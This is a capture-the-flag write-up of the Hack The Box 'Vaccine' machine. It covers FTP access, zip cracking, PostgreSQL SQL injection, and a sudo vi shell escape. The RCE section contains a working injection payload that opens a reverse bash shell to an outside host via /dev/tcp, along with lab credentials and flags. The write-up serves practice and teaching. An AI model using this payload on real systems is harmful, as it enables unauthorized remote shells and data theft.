# Hack The Box: Vaccine — Machine Writeup

### 📌 Overview & Metadata
*   **Target:** Vaccine (Linux)
*   **Concepts:** Password Cracking, Source Code Review, PostgreSQL SQL Injection, RCE via `COPY TO PROGRAM`, Sudo PrivEsc via `vi`
*   **Pwn Date:** 26 Aug 2026

### 🧠 Core Concepts: SQL Injection (SQLi)

Before diving into the exploit, it is important to understand the primary vulnerability that compromised this web application.

**What is SQL Injection (SQLi)?**
SQL Injection is a critical web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. It occurs when user-supplied input is directly included in a SQL query without proper sanitization or parameterization. 

Instead of the application treating the input as pure data, the database engine interprets the malicious input as executable code. This allows attackers to bypass authentication, extract sensitive data, modify database records, or—as demonstrated in this specific machine—execute arbitrary commands on the underlying operating system.

### 🔍 Reconnaissance & Initial Access

The attack path began with an Nmap scan targeting `10.129.95.174`. 
*   The scan revealed three open ports: 21 (vsftpd 3.0.3), 22 (OpenSSH 8.0p1), and 80 (Apache httpd 2.4.41).
*   I connected to the FTP service on port 21 using anonymous authentication, which successfully granted access.
*   Listing the directory contents revealed a file named `backup.zip`, which I downloaded to my Kali machine.

Attempting to unzip `backup.zip` prompted for a password.
*   I used `zip2john` to extract the password hash from the archive, saving it as `zip.hash`.
*   Running John the Ripper against `zip.hash` with the `rockyou.txt` wordlist successfully cracked the password, revealing it to be `741852963`.
*   Extracting the archive with this password yielded two files: `index.php` and `style.css`.

### 💻 Web Enumeration & Code Review

Analyzing the extracted `index.php` source code provided a critical breakthrough. The file contained backend connection logic indicating a PostgreSQL database.
*   The code explicitly revealed hardcoded database credentials: `user=postgres` and `password=P@s5w0rd!`.
*   It also showed the database name was `carsdb`.

### 💉 SQL Injection (SQLi) Assessment

Armed with a valid session cookie (`PHPSESSID=nnk2s9vd25laek4ejm3trb0j4k`), I targeted the web application's dashboard search functionality.
*   I fed the endpoint (`http://10.129.95.174/dashboard.php?search=`) into `sqlmap` to automate vulnerability testing.
*   `sqlmap` confirmed the GET parameter `search` was vulnerable to a Generic UNION query injection using 5 columns.
*   The tool successfully verified the backend database management system as PostgreSQL running on Ubuntu.

### 🎯 Remote Code Execution (RCE)

Because the backend was PostgreSQL and I had identified a confirmed SQL injection vector, I bypassed standard data exfiltration and escalated directly to Remote Code Execution. PostgreSQL versions 9.3 and above allow the execution of system commands via the `COPY ... TO PROGRAM` statement.

I crafted a malicious `curl` request to inject this specific command execution payload into the `search` parameter:

```bash
curl -G '[http://10.129.95.174/dashboard.php](http://10.129.95.174/dashboard.php)' \
--cookie 'PHPSESSID=nnk2s9vd25laek4ejm3trb0j4k' \
--data-urlencode "search='; COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.14.55/443 0>&1\"'; --"
```

This payload forced the database server to execute a reverse bash shell connecting back to my machine on port 443. My Netcat listener (`nc -lvnp 443`) caught the inbound connection, dropping me into a shell as the `postgres` user. 

I read the user flag from `/var/lib/postgresql/user.txt`: `ec9b13ca4d6229cd5cc1e09980965bf7`.

### 🚀 Privilege Escalation

My initial attempts to run `sudo -l` failed because I did not have the correct password for the `postgres` user at the terminal prompt. However, remembering the `P@s5w0rd!` credential extracted from the PHP source code earlier, I was able to successfully authenticate.

Executing `sudo -l` revealed that the `postgres` user was permitted to run `/bin/vi /etc/postgresql/11/main/pg_hba.conf` as root without any additional restrictions. 

Running `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf` opened the text editor with root privileges. By invoking shell execution from within `vi` (using the `:!/bin/sh` command), I bypassed the restricted editor environment and spawned a high-privileged root shell.

I navigated to the `/root` directory and captured the final flag from `root.txt`: `dd6e058e814260bc70e9bbdef2715849`.

### 💡 Remediation & Lessons Learned

This machine highlights severe flaws across the entire application stack:
1.  **Hardcoded Credentials:** Source code should never contain hardcoded database passwords, and backups containing source code must be properly secured.
2.  **SQL Injection:** User input in the `search` parameter was not properly parameterized, allowing direct execution of malicious SQL commands.
3.  **Sudo Misconfigurations:** Allowing a user to run a text editor like `vi` with `sudo` privileges is extremely dangerous, as built-in shell escape features allow trivial privilege escalation to root.
